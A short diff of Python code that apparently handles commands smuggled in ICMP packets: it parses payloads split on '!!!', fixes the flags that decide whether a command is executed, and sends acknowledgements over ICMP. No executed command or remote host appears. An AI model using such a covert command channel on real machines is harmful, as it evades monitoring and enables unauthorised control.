@@ -24,7 +24,8 @@ def reply(src, command, SSM):
         send_over_icmp(src, "ACKNOWLEDGED", SSM)
 
 def handle(pkt):
-    SSM = True  
+    execute = False
+    SSM = False
     src = pkt[IP].dst
     payload = str(pkt.payload)
     parsed = re.split('!{3}', payload)
@@ -39,10 +40,10 @@ def handle(pkt):
         elif command[0] == "$" and command[1] == "0":
             SSM = True
             execute = False
-        elif command[0] != "$" and command[1] == "1":
+        elif command[0] == "$" and command[1] == "1":
             SSM = True
-            execute = False
-        elif command[0] != "0" and command[1] == "1":
+            execute = True
+        elif command[0] == "0" and command[1] == "1":
             SSM = False
             execute = True
         else:
